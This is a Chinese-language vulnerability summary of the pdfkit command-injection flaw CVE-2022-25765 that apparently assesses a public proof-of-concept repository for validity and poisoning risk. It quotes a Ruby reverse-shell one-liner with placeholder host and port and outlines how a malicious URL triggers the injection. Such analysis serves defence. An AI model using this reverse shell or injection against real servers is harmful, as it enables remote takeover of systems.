## CVE-2022-25765-pdfkit-命令注入

**漏洞编号:** CVE-2022-25765

**漏洞类型:** 命令注入

**影响应用:** pdfkit

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 0.8.6 (实际上已修复的版本存在绕过，需要关注)

**利用条件:** 需要应用程序使用pdfkit处理不受信任的URL输入

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-25765是pdfkit gem中的一个命令注入漏洞。根据漏洞库信息和搜索结果，该漏洞是由于`pdfkit`没有正确地过滤URL输入导致的。攻击者可以通过在URL中注入恶意命令，从而在服务器上执行任意代码。

**有效性：**
提供的POC代码看起来有效。它演示了如何使用`curl`向目标地址发送包含恶意URL的POST请求。恶意URL利用ruby的`spawn`函数建立反向shell连接。

**投毒风险：**
查看提供的`/tmp/4a8560a36ca2bab047251d985ac038b9/README.md`文件内容。虽然文件主要提供的是漏洞利用说明和POC，但仍存在一定的投毒风险。 主要风险点在于利用代码中 `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=TCPSocket.new("LOCAL-ADDRESS",LOCAL-PORT))` ，
1. 如果攻击者诱导用户使用修改后的POC，将`LOCAL-ADDRESS`和`LOCAL-PORT`替换为攻击者控制的服务器，则可能使用户暴露在被攻击的风险中。
2. `screen1.png`和`screen.2.png` 这两个图片文件, 存在图片隐写后门的可能性. 需要进一步分析确定是否存在恶意代码。

因此，综合来看，虽然主要功能是提供漏洞利用信息，但该仓库存在一定的投毒风险，估计在10%左右。

**利用方式：**
利用方式主要包括以下几个步骤：
1.  攻击者找到一个使用`pdfkit`处理URL的应用程序。
2.  攻击者构造一个包含恶意命令的URL，并将其作为参数传递给`pdfkit`。
3.  `pdfkit`在生成PDF时，会执行URL中的恶意命令，从而导致命令注入。

具体来说，POC代码演示了通过POST请求的`url`参数传递恶意URL。恶意URL利用Ruby代码建立反向shell，从而使攻击者可以远程控制服务器。需要注意的是，POC中的`LOCAL-ADDRESS`和`LOCAL-PORT`需要替换为攻击者的IP地址和端口号。

**项目地址:** [shamo0/PDFkit-CMD-Injection](https://github.com/shamo0/PDFkit-CMD-Injection)

**漏洞详情:** [CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765)